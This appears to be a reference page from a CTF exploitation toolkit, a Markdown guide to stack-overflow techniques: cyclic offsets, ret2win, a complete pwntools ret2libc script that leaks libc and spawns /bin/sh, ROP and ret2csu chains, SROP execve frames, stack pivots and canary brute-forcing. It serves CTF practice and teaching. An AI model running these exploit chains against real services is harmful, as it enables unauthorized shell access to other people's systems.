# Stack exploitation — offsets, ret2win, ret2libc, ROP, SROP, pivots

Assumes a stack overflow (gets/read/scanf into a local buffer). Handle
canary/PIE first if triage (`references/mitigations.md`) says so.

## 1. Offset to saved RIP

```bash
scripts/ctf cyclic 300                   # de Bruijn pattern (4-byte subsequence)
scripts/ctf cyclic -l 0x61616168         # crash value -> offset
skills/ctf-pwn/scripts/off.py ./dist/chal   # automated: crash + core dump solve
```

Manual gdb: feed the pattern, at SIGSEGV:

```
(gdb) x/gx $rsp        # 0x61616168 -> cyclic -l 0x61616168
```

Gotchas:
- `sendline` appends `\n` (gets eats it); `scanf("%s")` stops at whitespace —
  cyclic letters survive; a fixed-size `read()` caps your pattern length.
- i386: `ret` pops 4 bytes — use `p32`; cyclic's default 4-byte subsequence
  works for both word sizes.

## 2. ret2win

```bash
nm ./dist/chal | grep -iE 'win|flag|shell|backdoor'    # if not stripped
```

```python
payload = b"A" * offset + p64(elf.sym["win"])          # p32 on i386
```

If `win(arg)` needs arguments, prepend argument gadgets (`pop rdi; ret`).
Crash right after entering a libc function → section 7 (alignment).

## 3. ret2libc (leak puts, compute base, system)

Canonical two-stage amd64 flow (no PIE, canary handled or absent):

```python
#!/usr/bin/env python3
from pwn import *

elf  = ELF("./chal")
libc = ELF("./libc.so.6")            # the pwninit-matched handout libc
context.arch = "amd64"

io = process("./chal_patched")       # remote("host", 1337) to ship
offset = 72                          # from scripts/off.py

rop = ROP(elf)
pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]
ret     = rop.find_gadget(["ret"])[0]     # movaps alignment, section 7

# stage 1: puts(puts@got) then re-enter main for a second input
io.sendlineafter(b"> ", flat(
    b"A" * offset,
    pop_rdi, elf.got["puts"], elf.plt["puts"], elf.sym["main"],
))
leak = u64(io.recvline().strip().ljust(8, b"\x00"))
libc.address = leak - libc.sym["puts"]
log.success("libc base %#x", libc.address)

# stage 2: system("/bin/sh")
binsh = next(libc.search(b"/bin/sh\x00"))
io.sendlineafter(b"> ", flat(
    b"A" * offset,
    ret, pop_rdi, binsh, libc.sym["system"],
))
io.interactive()
```

Leak alternatives: `write@got` via `write@plt`, `printf@got` — any function
callable with one pointer argument and a known libc symbol.

### Identifying the libc from a leak

| Method | Command/URL |
|---|---|
| web databases | https://libc.rip , https://libc.blukat.com (paste leaked symbol offsets) |
| local database | `git clone https://github.com/niklasb/libc-database`, then `./find puts 5f0` (symbol + last 3 hex digits), `./download <id>` |
| host glibc | `ldd --version` / `getconf GNU_LIBC_VERSION` (local no-handout targets only) |
| handout libc | `strings libc.so.6 \| grep -m1 "GNU C Library"` |

With the libc known, try `one_gadget ./libc.so.6`
(`references/toolchain.md`): if a gadget's constraints already hold at your
control point, stage 2 collapses to a single address.

## 4. pwntools ROP class

```python
rop = ROP([elf, libc])              # searches both, prefers elf
rop.call(elf.sym["win"], [0xdeadbeef])          # sets up arg registers
rop.call(libc.sym["system"], [next(libc.search(b"/bin/sh\x00"))])
chain = rop.chain()
print(rop.dump())                   # review the chain before shipping
payload = flat({offset: chain})
```

- `rop.find_gadget(["pop rdi", "ret"])` / `(["ret"])` — gadget object (`[0]`
  is the address) or None.
- Register sugar: `rop.rdi = value` queues a `pop rdi` when one exists.
- Missing `pop rdi` in a small dynamic binary → **ret2csu**: `__libc_csu_init`
  gadgets (`pop rbx,rbp,r12,r13,r14,r15; ret` then
  `mov rdx,r13; mov rsi,r14; mov edi,r15d; call [r12+rbx*8]`) set rdi/rsi/rdx.
  Only in binaries linked against glibc < 2.34 — check `nm ./chal | grep
  csu`. Static binaries: just search gadgets with ROPgadget.

## 5. SROP (sigreturn-oriented programming)

One `rt_sigreturn` syscall (15 on amd64, 119 on i386) with a crafted
`SigreturnFrame` on the stack restores *all* registers at once.
Preconditions: a `syscall; ret` gadget, rax = 15 at that gadget, and ~250
bytes of controlled stack after it.

```python
context.arch = "amd64"
pop_rax    = rop.find_gadget(["pop rax", "ret"])[0]
syscall_ret = ...   # ROPgadget --binary libc.so.6 --only "syscall|ret"

frame = SigreturnFrame()
frame.rax = constants.SYS_execve     # 59
frame.rdi = next(libc.search(b"/bin/sh\x00"))
frame.rsi = 0
frame.rdx = 0
frame.rsp = libc.bss(0x200)          # writable landing stack
frame.rip = syscall_ret

# executing syscall with rax=15 restores the frame, which then runs execve
payload = flat(b"A" * offset, pop_rax, 15, syscall_ret, bytes(frame))
```

Use when gadget-starved (one write of rax buys every register) or to set up
mprotect/execve in a single shot.

## 6. Stack pivot (overflow too small for a chain)

You control only 8-24 bytes past saved RIP but have a big controlled buffer
elsewhere (heap chunk, bss, environment copy): pivot rsp into it.

| Gadget | Effect | Need |
|---|---|---|
| `leave; ret` | rsp = rbp, pop rbp, ret | rbp control first (`pop rbp; ret`) |
| `pop rsp; ret` | rsp = popped value | direct; gadget is rare |
| `xchg rsp, rax; ret` | rsp = rax | rax holding your buffer |
| `add rsp, 0xNN; ret` | skip forward into a longer copy | junk prefix sized |

```python
# leave;ret pivot: set rbp = fake-8, buffer 'fake' = [new_rbp][chain...]
payload = flat(b"A" * offset, pop_rbp, fake - 8, leave_ret)
# leave: rsp=rbp(fake-8); pop rbp -> rsp=fake; ret -> rip=*(fake), rsp=fake+8
```

Search: `scripts/ctf ROPgadget --binary ./chal | grep -E 'leave ; ret|pop rsp|xchg rsp'`.

## 7. Stack alignment (the movaps crash)

Symptom: chain works locally, SIGSEGV on target (or only under gdb) at
`movaps xmm…, [rsp]` inside `system`/`do_system` — seen on glibc 2.27+ builds.
Cause: SysV amd64 requires rsp % 16 == 8 at function entry; the ROP `ret`
delivered rsp % 16 == 0.

Fix: insert one extra `ret` gadget immediately before the libc call (shifts
rsp by 8), or pad/shorten the junk by 8. Verify: `b *system`, `p $rsp % 16`.

## 8. Partial overwrite (when leaks are impossible)

- Overwrite only the low 1-2 bytes of a saved RIP or a libc pointer: low 12
  bits of any pointer are fixed (page offset). 1-byte overwrite of a code
  pointer is deterministic when the target shares the 0x1000 page; a 2-byte
  overwrite guesses 4 bits = 1/16 (math: `references/mitigations.md`).
- Byte-by-byte brute force works on fork servers: fork inherits ASLR, canary
  and heap layout, so each connection refines one byte; wrong guess = crash,
  reconnect, continue. Same technique brute-forces the canary (1/256/byte).

## 9. Related

- Format-string leaks often replace stage 1: `references/format-string.md`.
- Overflow lands in heap structs instead of a stack frame:
  `references/heap.md`.
